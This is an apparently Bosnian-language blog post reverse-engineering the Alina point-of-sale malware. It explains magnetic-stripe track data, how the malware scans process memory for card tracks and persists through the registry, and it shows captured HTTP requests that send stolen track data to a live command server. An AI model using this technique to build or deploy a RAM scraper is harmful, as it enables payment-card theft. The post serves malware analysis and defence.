<!doctype html>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, minimal-ui">
        <title>Malware/ Alina POS - Reverse engineering</title>

        <meta name="theme-color" content="#252525">

	<link href="https://fonts.googleapis.com/css?family=Amiri" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Raleway:100" rel="stylesheet" type="text/css">
	<link href="https://fonts.googleapis.com/css?family=Roboto+Mono:100,300,400" rel="stylesheet" type="text/css">
        <link href="https://fonts.googleapis.com/css?family=Fira+Mono:400,700|Open+Sans:300,400,600|Raleway:200,300,400,600&amp;subset=latin-ext" rel="stylesheet">

        <link rel="stylesheet" href="assets/css/normalize.css">
        <link rel="stylesheet" href="assets/css/skeleton.css">
        <link rel="stylesheet" href="assets/css/home.css">

    </head>
    <body>

        <div class="container" style="margin-top: 30px;">

            <div class="row">
                <p style="text-align:center;">
                    <img src="assets/img/duraki-logo.png" alt="duraki logo"/>
                </p>
            </div>

	    <div class="row">
                <div class="one-sixth column" style="margin-top: 10%; margin-left: 0%";>
                    <h3><a href="/">blog</a> / <a href="">Malware/ Alina POS - Reverse engineering</a></h3>
                </div>
	    </div>

            <div class="tags">
            <code class="tags-code">malware</code>
            <code class="tags-code">alina</code>
            <code class="tags-code">shop</code>
            <code class="tags-code">carders</code>
            <code class="tags-code">pos</code>
            <code class="tags-code">reverse</code>
            <code class="tags-code">analysis</code>
            </div>

	    <hr style="display: block; text-align: left; width: 100%;" />

            <div class="row">
                <div class="six columns" style="margin-top: 0%;"><h2 id="intro"><a class="header-link" href="#intro"></a>Intro</h2>
<p>Danas sam provjerio kernelmode jer nisam odavno ulazio tu i naletio sam na Alina POS malware, a meni su POS malware najdraži za reversanje. Razlog tome je zato što tako jednostavna ideja ima ishod bankrota u nekim država. Iako su ideološki lagani za napraviti, teško ih je detektovati i izbjeći susret sa njima. Ovo će biti malo duži post zato što ću pričati o čitavom procesu POS malware-a.</p>
<h2 id="šta-je-pos-malware-(i)"><a class="header-link" href="#šta-je-pos-malware-(i)"></a>Šta je POS Malware (I)</h2>
<p>Recimo da znate šta je malware (softver koji ima namjeru da našteti sistemu na bilo koji način), međutim, ne razumjete pojam POS Malware. POS (point of sale) je standardni naziv za kasu u bilo kojoj prodavnici gdje se barkodovi otkucavaju i gdje vi na kraju platite kupljenu robu. Većina POS kasa ima povezan hardver sa kojim možete platiti preko vaše kreditne/debitne kartice. Takav hardver se naziva EFTPOS odnosno &quot;electronic fund transfer @ point of sale&quot;. To je sistem za plaćanje kod kojeg se kartica u većini slučajeva provlači kroz utor ili se ubacuje. Postoje dva načina za plačanje na kasi, a to je keš ili elektronsko plaćanje, međutim plaćanje elektronskim putem ima također dva načina. Jedan je &quot;Swipe&quot; način, a drugi je &quot;Swipe/Utor + PIN&quot;.</p>
<p class="img-container"><img src="http://i.imgur.com/JN6CefO.jpg" alt="EFTPOS"></p>
<h2 id="swipe"><a class="header-link" href="#swipe"></a>SWIPE</h2>
<p>Ovaj način se najčešće koristi u SAD a preko njega se vrši procesuiranje kartice. Swipe je u zapisan po standardu koda 101, a plaćanje se vrši tako što blagajnik na kasi uzme vašu karticu i provuće je kroz citac kartica. Čitač kartica u tom trenutku izvlači sve podatke sa magnetic stripe te vrši softverski proces.</p>
<p class="img-container"><img src="http://i.imgur.com/lZ7bCxZ.gif" alt="SWIPE"></p>
<h2 id="swipe/utor-+-pin"><a class="header-link" href="#swipe/utor-+-pin"></a>SWIPE/UTOR + PIN</h2>
<p>Ovaj način se koristi i kod nas a pod ISO standardom je obilježen kodom 102/103. Kada predamo karticu blaganijku (ili blagajnici) na kasi, on/ona ili ubaci karticu u poseban utor EFTPOS-a ili provuće karticu, a zatim vas pita za PIN kod koji vi kucate. Ako se radi o prvom načinu gdje karticu ubaci u utor hardvera, ta kartica je novije proizvodnje a radi se o &quot;card + chip&quot; modu. Ako je pak provukla karticu, onda se radi o starijoj proizvodnji &quot;card + stripe&quot; modu. Svakako da je u oba slučaja potreban pin.</p>
<p class="img-container"><img src="http://i.imgur.com/QxxQKe6.jpg" alt="PINPLEASE"></p>
<p>Sada kada znamo kako radi elektronsko plaćanje možemo krenuti sa reversanjem. Da prije svega napomenem nešta, kartice su jako opširna tema i trebalo bi mi dosta da napišem na koji način rade iste, šta se nalazi na magnetnoj traci (iako ću o ovome malo pisati) te šta se sve dešava u pozadini. Ako je neko zainteresiran ali pravo i ako vas se skupi grupa ljudi koja voli čitati o tome, obratite mi se na twitteru/PM/irc-u ili emailu i ja ću rado pisati o tome.</p>
<h2 id="šta-je-pos-malware-(ii)"><a class="header-link" href="#šta-je-pos-malware-(ii)"></a>Šta je POS Malware (II)</h2>
<p>U ovom dijelu ću detaljno objasniti šta radi POS malware. Da krenemo od toga šta je sve zapisano na magnetnoj traci kartice. Kao što znamo, i kao što sam već napisao, kartice imaju magnetnu traku, a noviji modeli koji su samim tim sigurniji imaju i čip. Na magnetnoj traci su zapisani podaci koji se zovu u &quot;slengu&quot; DUMP. DUMP sadrži informacije o trakama, a &quot;karderi&quot; ih najčešće dobijaju putem skimminga. Evo kako izgleda data magnetne trake:</p>
<pre class="hljs"><code><span class="hljs-number">4730770006751710</span>=<span class="hljs-number">140310110000420</span> ; B4730770006751710^MARKO^<span class="hljs-number">14031011000000420000000</span></code></pre><p class="img-container"><img src="http://i.imgur.com/uQ9kpNz.png" alt="MAGNETNA TRAKA"></p>
<p>Kao što vidite, traka sadrži pojedine stringove, a detaljno o tome možete pročitati na wikipediji, link je u pasusu za reference, kao i u skoro svakom postu, na kraju. Ne bi bilo loše da to pročitate, možda će vam trebati kroz život. Šta napadač inače traži jeste traku #1, koju kasnije ispisuje na blanko kartici preko pisača kartica.  </p>
<p>Šta POS malware inače radi jeste, dok primjera kupujete nešta preko kartica, blagajnik provuče karticu a malware čita podatke iz memorije sistema. Da bi vam lakše to objasnio, nacrtao sam još jedan dijagram koji možete pogledati ispod. Glavno je zapamtiti da malware ne radi ništa posebno nego skenira range memorije procesa koji su dozvoljeni za čitanje, i provjerava određeni ASCII iz memorije sa regex patternom (Traka 1).</p>
<p class="img-container"><img src="http://i.imgur.com/oq3udJq.png" alt="POS MALWARE"></p>
<h2 id="smash-the-malware!"><a class="header-link" href="#smash-the-malware!"></a>Smash the malware!</h2>
<p>Dosta je bilo priče o procesu, nadam se da vam je sve objašnjeno, nije moglo detaljnije da bude nikako. Kao što rekoh, preuzeo sam malware sa kernelmode a postavio ga je Xylitol. Nedavno mi je rekao da je reversao nekoliko puta Alinu i da je ovo najnovija verzija (7.*) za koju nema builder.</p>
<p class="img-container"><img src="http://i.imgur.com/o1Het9F.png" alt="KernelMode"></p>
<pre class="hljs"><code><span class="hljs-symbol">MD5:</span> <span class="hljs-number">017</span>c34b47659565fa5a621a2b7a9d4a7
<span class="hljs-symbol">SHA:</span> <span class="hljs-number">43</span>afd24048a0281d6f4699627d2363e847b34aa8</code></pre><p>Kad se malware pokrene, otvara User Shell folder u registriju i prati lokaciju &quot;Application Data&quot; te se kopira u sub-folder &quot;Install&quot;, a zatim se doda u registriji na startup za trenutnog korisnika. Tu drop-a fajl &quot;ntfs.dat&quot;.</p>
<p class="img-container"><img src="http://i.imgur.com/tcerQeL.png" alt="REGISTRY POS"></p>
<p class="img-container"><img src="http://i.imgur.com/5kb8UdG.png" alt="FILE DROP POS"></p>
<p>Kao što sam i očekivao, kada loadujem eksekutabl u debugger, brejka se svaka operacija, tzv. <strong>anti-debug trikovi</strong>. No dobro, nije da ih je teško zaobići. Nakon zaobilaska anti-debugging tehnike, vidim da je <strong>E</strong>(entry)<strong>P</strong>(oint) <code>0x0000A713</code>.</p>
<p class="img-container"><img src="http://i.imgur.com/UxK7McX.png" alt="ENTRY POINT"></p>
<p>Na samom početku, ovaj POS malware kreira snapshot koristeći se CreateToolHelp32Snapshot APIom sa flag-om TH32CS_SNAPALL, a taj flag označava sve procese sistema. Znači da je već sumnjivo. Ko je radio svoj very-own task manager u nekom jeziku, zna da se morao koristiti tim APIom.</p>
<p class="img-container"><img src="http://i.imgur.com/ZRK8966.png" alt="Process"></p>
<p>Ako pogledam malo niže, vidim da se poziva Process32First API koji se nalazi u istom modulu (help) Windows API-a. Šta više, ovaj API se poziva kada želimo dobiti povratne informacije snapshota koji je malware izvukao maloprije postavljajući TH32CS_SNAPALL flag.</p>
<p class="img-container"><img src="http://i.imgur.com/7xVG65F.png" alt="Process 2"></p>
<p>Ekskludamo proces sa kojeg pozivamo funkciju i vraćamo njegov ID (izbacujemo svoj proces):</p>
<pre class="hljs"><code><span class="hljs-number">0040594D</span>   &gt; FF15 40A04100  <span class="hljs-keyword">CALL</span> <span class="hljs-built_in">DWORD</span> <span class="hljs-built_in">PTR</span> <span class="hljs-built_in">DS</span>:[&lt;&amp;KERNEL32.GetCurrent&gt;<span class="hljs-comment">; [GetCurrentProcessId]</span></code></pre><p>Na <strong>0x405A80</strong> se već poziva Process32Next, sa kojim idemo na sljedeći proces već urađenog snapshota. Ne može biti lakša tehnika.</p>
<p class="img-container"><img src="http://i.imgur.com/gqufGMR.png" alt="Process 3"></p>
<p>Kada malware nađe prvi proces sa liste, u ovom slučaju smss.exe, provjerava da li je taj proces od sistema ili je nešta drugo. Ako je od sistema, nema potrebe da ga skenira tako da ga ignoriše.</p>
<p class="img-container"><img src="http://i.imgur.com/Vwjf2jf.png" alt="Proces not 4"></p>
<p>Vrti loop petlju i provjerava sljedeće procese koji su mu default, <code>{svchost.exe, iexplorer.exe, explorer.exe, crhome.exe, firefox.exe, smss.exe, csrss.exe, sykpe.exe, pidgin.exe, wininit.exe, steam.exe, devenv.exe, thunderbird.exe, winlogon.exe, services.exe itd.}</code>. Te procese također izbacuje od sljedeće operacije.</p>
<p class="img-container"><img src="http://i.imgur.com/nB7vvlI.png" alt="Process finder"></p>
<p>Budući da je pretjerano prolaziti kroz svaki proces i pritiskati <code>F8</code> 1000x morao sam udariti patch na <code>0x405A12</code>.</p>
<pre class="hljs"><code><span class="hljs-number">00405</span>A12   .^<span class="hljs-number">72</span> E0          JB SHORT windefen<span class="hljs-number">.004059</span>F4 &gt; <span class="hljs-number">00405</span>A12    ^<span class="hljs-number">74</span> E0</code></pre><p>Otvara proces da bi u njega krenuo sa main funkcijom.</p>
<p class="img-container"><img src="http://i.imgur.com/f30Ewto.png" alt="Proces found"></p>
<p>Main funkcija, postavlja se ime procesa u registar eax, pushamo eax, zatim se sa stacka također izvlači regex koji je predefinisan u varijablu.</p>
<pre class="hljs"><code><span class="hljs-number">00405</span>AE6   . <span class="hljs-number">50</span>             PUSH EAX                                 ;  vadimo eax iz stack-a
<span class="hljs-number">00405</span>AE7   . <span class="hljs-number">68</span> C4F74100    PUSH windefen<span class="hljs-number">.0041</span>F7C4                   ;  ASCII <span class="hljs-string">"{[!16!]}{[!46!]}%s (%d)"</span></code></pre><p>Poslije toga se poziva <code>VirtualQueryEx</code> API da se utvrdi readable memorija unutar određenog procesa, a onda se čita byte po byte (ReadProcessMemory) i komparira isti string sa regexom (regular expression pattern).</p>
<pre class="hljs"><code><span class="hljs-number">004049B7</span>  |. <span class="hljs-number">51</span>             ||PUSH ECX                               ; /pBytesRead
<span class="hljs-number">004049B8</span>  |. <span class="hljs-number">50</span>             ||PUSH EAX                               ; |BytesToRead
<span class="hljs-number">004049B9</span>  |. <span class="hljs-number">57</span>             ||PUSH EDI                               ; |Buffer
<span class="hljs-number">004049BA</span>  |. FF7424 <span class="hljs-number">44</span>      ||PUSH DWORD PTR SS:[ESP+<span class="hljs-number">44</span>]             ; |pBaseAddress
<span class="hljs-number">004049BE</span>  |. FF33           ||PUSH DWORD PTR DS:[EBX]                ; |hProcess
<span class="hljs-number">004049C0</span>  |. FF15 60A04100  ||CALL DWORD PTR DS:[&lt;&amp;KERNEL32.ReadProc&gt;; \ReadProcessMemory</code></pre><h2 id="network-analiza"><a class="header-link" href="#network-analiza"></a>Network analiza</h2>
<p>Sada kada znamo kako malware radi, na kom principu se svodi, potrebno je da se upoznamo sa njegovim postupcima kada se nađe dump u memoriji. Mislim da je moje vrijeme da zasijam sa C-om :) Ispisao sam malu skriptu koja printa fake traku. Napomena: Ako mislite zašto jednostavno nisam zalijepio lažnu traku u notepad, razlog tome je zato što notepad nema output nego konverzaciju iz outputa u UTF. Samim tim ga malware ne čita kao string već kao ASCII kod. A to su dvije različite stvari. :)  </p>
<p>Program pisan u C koristi se kao lažna traka koja je provučena i sad je u memoriji:</p>
<p>{% highlight c %}</p>
<p>#include <iostream.h></p>
<p>// dn5 // <a href="http://dn5.ljuska.org">http://dn5.ljuska.org</a>
// @dn5__</p>
<p>int main()
{
    char traka1[100] = &quot;%B4730770006751710^MARKO^14051015000000420000000?&quot;;
    char traka2[100] = &quot;;4730770006751710=140510110000420?\n&quot;;</p>
<pre class="hljs"><code><span class="hljs-built_in">printf</span>(traka1); <span class="hljs-comment">// Traka 1</span>
<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n"</span>);
<span class="hljs-built_in">printf</span>(traka2); <span class="hljs-comment">// Traka 2</span>
getchar(); <span class="hljs-comment">// grrr</span>
<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;</code></pre><p>}
{% endhighlight %}</p>
<p>Kada Alina detektuje traku ili trake, šalje request na panel. Prvi request se šalje za vrijeme startup-a, a drugi kad se kao što sam rekao detektuju trake.  </p>
<p><strong>Request #1</strong>:</p>
<pre class="hljs"><code><span class="hljs-selector-tag">3</span>    <span class="hljs-selector-tag">TCP</span>    <span class="hljs-selector-tag">192</span><span class="hljs-selector-class">.168</span><span class="hljs-selector-class">.1</span><span class="hljs-selector-class">.175</span>    <span class="hljs-selector-tag">193</span><span class="hljs-selector-class">.109</span><span class="hljs-selector-class">.68</span><span class="hljs-selector-class">.159</span>    <span class="hljs-selector-tag">4422</span>    <span class="hljs-selector-tag">80</span>    <span class="hljs-selector-tag">computer_1</span><span class="hljs-selector-class">.ASUS</span>    <span class="hljs-selector-tag">888andro</span><span class="hljs-selector-class">.net</span>    <span class="hljs-selector-tag">http</span>    <span class="hljs-selector-tag">9</span>    <span class="hljs-selector-tag">1</span>,<span class="hljs-selector-tag">708</span> <span class="hljs-selector-tag">Bytes</span>    <span class="hljs-selector-tag">2</span>,<span class="hljs-selector-tag">392</span> <span class="hljs-selector-tag">Bytes</span>    <span class="hljs-selector-tag">11</span><span class="hljs-selector-class">.9</span> <span class="hljs-selector-tag">KB</span>/<span class="hljs-selector-tag">Sec</span>    <span class="hljs-selector-tag">1</span>/<span class="hljs-selector-tag">2</span>/<span class="hljs-selector-tag">2014</span> <span class="hljs-selector-tag">11</span><span class="hljs-selector-pseudo">:35</span><span class="hljs-selector-pseudo">:10</span> <span class="hljs-selector-tag">PM</span><span class="hljs-selector-pseudo">:397</span>    <span class="hljs-selector-tag">1</span>/<span class="hljs-selector-tag">2</span>/<span class="hljs-selector-tag">2014</span> <span class="hljs-selector-tag">11</span><span class="hljs-selector-pseudo">:35</span><span class="hljs-selector-pseudo">:10</span> <span class="hljs-selector-tag">PM</span><span class="hljs-selector-pseudo">:537</span>    <span class="hljs-selector-tag">00</span><span class="hljs-selector-pseudo">:00</span><span class="hljs-selector-pseudo">:00.140</span>                    

<span class="hljs-selector-tag">Content-Type</span>: <span class="hljs-selector-tag">application</span>/<span class="hljs-selector-tag">octet-stream</span>
<span class="hljs-selector-tag">Connection</span>: <span class="hljs-selector-tag">Close</span>
<span class="hljs-selector-tag">User-Agent</span>: <span class="hljs-selector-tag">Mozilla</span>/<span class="hljs-selector-tag">4</span><span class="hljs-selector-class">.0</span> (compatible; MSIE <span class="hljs-number">7.0</span>; Windows NT <span class="hljs-number">5.1</span>; InfoPath.<span class="hljs-number">1</span> Spark v1.<span class="hljs-number">1</span>
<span class="hljs-attribute">Host</span>: <span class="hljs-number">888</span>andro.net
<span class="hljs-attribute">Content-Length</span>: <span class="hljs-number">1210</span>
<span class="hljs-attribute">Cache-Control</span>: no-cache

....................................................................C.....<span class="hljs-number">6</span>...".wV.Z...UWPQV1%IGfHzV.[..GUW.QPd%HEfM(V.Z..DUWPQV6%HDfO.V.\...UQ.QW1%IAfI|V.    ...US.QP6%NGfL,V....FURTQR2%MCfLsV....<span class="hljs-variable">@UV</span>.QS5%MMfLV....MUWYQV2%IMfHsV.Y...UW.QV1%IDfIxV.....UWSQVe%O.fHzV.Z...UVPQV1%ICfH{V.\...US.QPb%HDfI~V....DUQ.QRd%OCfNxV.^..MUQUQR2%LDfMsV.]..<span class="hljs-variable">@USYQS5</span>%HEfHrV.    ..CUWYQV8%HLfJ+V.Z...UWPQV1%IGfHzV.[..GUW.QPd%HEfM(V.Z..DUWPQV6%HDfO.V.\...UQ.QW1%IAfI|V.    ...US.QS3%MAfL|V.\...UR.QWe%L<span class="hljs-variable">@fMrV</span>.
..EUVYQV1%ICfIsV....LUT.QPb%I.fI{V.    ..GUVQQVc%IGfI/V.\..EUS.QPb%HDfI{V....DUQ.QRd%M.fO(V.    ..AUWWQW1%O.fM.V....<span class="hljs-variable">@URPQR5</span>%LFfL)V.....URTQR8%L<span class="hljs-variable">@fHzV</span>....<span class="hljs-variable">@UWTQV6</span>%HLfJ+V.Z...UWPQV1%IGfHzV.[..GUW.QPd%HEfM(V.Z..DUWPQV6%HDfO.V.\...UQ.QW1%IAfI|V.    ...US.QSe%L.fM~V.
..EURPQS4%H.fH(V.]..<span class="hljs-variable">@USYQS5</span>%HEfHrV....AUWUQV0%HLfJ+V.Z...UWPQV1%IGfHzV.[..GUW.QPd%HEfM(V.Z..DUWPQV6%HDfO.V.\...UQ.QW1%IAfI|V.    ...US.QR2%L<span class="hljs-variable">@fL</span>}V.
..AURXQR4%H.fLV....<span class="hljs-variable">@UVQQW8</span>%IDfIsV....CUWYQW9%J.fO(V.Y..DUWPQV2%HEfI)V.
...UQ.QW0%M.fO(V.    ..DUWWQW1%O.fM.V.Z...UVPQV4%ICfH{V.\...UR.QR3%MEfL{V.....USUQWe%L<span class="hljs-variable">@fMrV</span>.
..EUVYQV2%IEfIsV.
..GUVXQUa%O.fI+V.    ..DUWSQW0%I.fI{V.
...UQ.QW0%M.fO(V.    ..DUWWQW1%O.fM.V.Z...UVPQV4%ICfH{V.\...USRQSd%MFfL/V....CURWQWe%L<span class="hljs-variable">@fMrV</span>.
..EUVYQV2%ICfI{V....AUVXQUa&amp;</code></pre><p><strong>Request #2</strong> (detekcija trake):</p>
<pre class="hljs"><code><span class="hljs-number">4</span>    TCP    <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.175</span>    <span class="hljs-number">193.109</span><span class="hljs-number">.68</span><span class="hljs-number">.159</span>    <span class="hljs-number">4426</span>    <span class="hljs-number">80</span>    computer_1.ASUS    <span class="hljs-number">888</span>andro.net    http    <span class="hljs-number">7</span>    <span class="hljs-number">622</span> Bytes    <span class="hljs-number">1</span>,<span class="hljs-number">406</span> Bytes    <span class="hljs-number">4.7</span> KB/Sec    <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2014</span> <span class="hljs-number">11</span>:<span class="hljs-number">37</span>:<span class="hljs-number">18</span> PM:<span class="hljs-number">051</span>    <span class="hljs-number">1</span>/<span class="hljs-number">2</span>/<span class="hljs-number">2014</span> <span class="hljs-number">11</span>:<span class="hljs-number">37</span>:<span class="hljs-number">18</span> PM:<span class="hljs-number">181</span>    <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00.130</span>                    

POST /insider/loading.php HTTP/<span class="hljs-number">1.1</span>
Accept: application/octet-stream
Content-Type: application/octet-stream
Connection: Close
User-Agent: Mozilla/<span class="hljs-number">4.0</span> (compatible; MSIE <span class="hljs-number">7.0</span>; Windows NT <span class="hljs-number">5.1</span>; InfoPath<span class="hljs-number">.1</span> Spark v1<span class="hljs-number">.1</span>
Host: <span class="hljs-number">888</span>andro.net
Content-Length: <span class="hljs-number">181</span>
Cache-Control: no-cache

....................................................................N........<span class="hljs-number">.1</span>.wV....TDAWV30%IBfI}V....SDATV36%IBfIV.    ..TDAUV30%I.fI{V....SDAQV31%IEfI{V.    ..SDATV30%IEfI~V.
..SDA.U</code></pre><p>Kao što vidimo, radi se o octet-stream. Budući da nisam toliko upućen u <strong>MITMA</strong> izguglao sam šta je <em>octet-stream</em>. Radi se o type-u koji nije tekst već binarni fajl. Znači da ga server ne registruje kao ASCII nego datoteku. Ipak palim Olly opet da vidim o čemu se radi. Postavio sam nekoliko breakpointa da vidim šta se dešava i otkud taj fajl koji se šalje preko requesta. Emulacija <code>CreateFileA</code> se javlja na adresi <code>0x401F48</code>. Ako pogledate EAX registar vidite koji se fajl kreira.</p>
<p class="img-container"><img src="http://i.imgur.com/Pxltzmf.png" alt="File creation"></p>
<p>Kasnije se isti taj kreirani fajl uzima i pod case (slučaj) se bira random ime koji su predefinisani: <code>adobeflash.exe</code>, <code>desktop.exe</code>, <code>jucheck.exe</code>, <code>jusched.exe</code>, <code>java.exe</code>.
Poziv API-a <code>InternetOpenA</code> se nalazi na adresi <code>0x404089</code> i tu sam već postavio breakpoint kada sam gledao module.</p>
<pre class="hljs"><code><span class="hljs-symbol">00404089 </span>  . FF15 <span class="hljs-number">98</span>A14100  <span class="hljs-keyword">CALL</span> DWORD PTR DS:[&lt;&amp;WININET.InternetOpe&gt;;  WININET.InternetOpenA</code></pre><p>I opet sam se satima vukao po debuggeru gore dole, lijevo desno, išao redom ali nisam mogao naći izvor fajla. I tek sam na kraju skontao da je panel broken i da nema opet nikakve koristi od toga. Stim da sam provjeravao enkripcije koju koristi Alina, ali opet nula bodova. Na kraju sam digao ruke jer gaf nije htio da mi pup<strong>i k</strong>u. Možda opet nekad pogledam taj request, ali trenutno mi je muka od adresa. Inače, već posjedujem stari izvorni kod Aline, mnogo je loše ispisan, 24+ threada su pozvani, 100% CPU usage. Ovaj izgleda još gore, vidi se da se radi o prljavim parama. POS malwarei su sami po sebi zanimljiva ideja, ali napraviti jedan koji će biti baš optimizovan je već malo teže. :)  </p>
<h2 id="zanimljivosti"><a class="header-link" href="#zanimljivosti"></a>Zanimljivosti</h2>
<pre class="hljs"><code>EFTPOS tehnologija je uvedena <span class="hljs-number">1981</span>. godine u SAD
EFTPOS je najčešć<span class="hljs-selector-tag">i</span> oblik plaćanja u Australiji, zatim u Novom Zelandu, <span class="hljs-selector-tag">a</span> na treć<span class="hljs-selector-tag">em</span> mjestu u SAD
Magnetska traka nekad sadrž<span class="hljs-selector-tag">i</span> samo track-<span class="hljs-number">1</span> data jer je ona u biti najvažnija
Alina source <span class="hljs-selector-tag">code</span> je na prodaji za <span class="hljs-number">2000</span>$
Očekuje se da će se POS malware u <span class="hljs-number">2014</span>. proširiti maksimalno  </code></pre><h2 id="pojedine-riječi"><a class="header-link" href="#pojedine-riječi"></a>Pojedine riječi</h2>
<pre class="hljs"><code><span class="hljs-attr">sleng</span> = ulični riječnik
<span class="hljs-attr">karder</span> = neko ko se bavi kartičnim fraudom
<span class="hljs-attr">skimming</span> = tehnika u kojoj je hardver zamjenjen lažnim na ATM
<span class="hljs-attr">BIN</span> = bank identification number (prvih šest brojeva na kartičnog broja koje označavaju izdavačku banku kartice)</code></pre><h2 id="reference"><a class="header-link" href="#reference"></a>Reference</h2>
<pre class="hljs"><code>http:<span class="hljs-regexp">//</span>en.wikipedia.org<span class="hljs-regexp">/wiki/</span>Point_of_sale
http:<span class="hljs-regexp">//</span>en.wikipedia.org<span class="hljs-regexp">/wiki/</span>EFTPOS
http:<span class="hljs-regexp">//</span>en.wikipedia.org<span class="hljs-regexp">/wiki/</span>Magnetic_stripe_card
http:<span class="hljs-regexp">//</span>kb.iu.edu<span class="hljs-regexp">/data/</span>agtj.html</code></pre>
                </div>
            </div>

	    <hr style="display: block; text-align: left; width: 100%;" />

            <small style="font-family: 'Amiri'; color:rgba(68, 63, 63, 0.42)">this project, script
                or post is written by @durakih (c) 2017 | <a style="font-size: 11px;" href="/changelog.html">[changelog]</a> | <a style="font-size: 11px;" href="https://twitter.com/devil_tux">[twitter]</a></small>

        </div>

      <script type="text/javascript" src="./assets/js/ga.js"></script>
    </body>
</html>
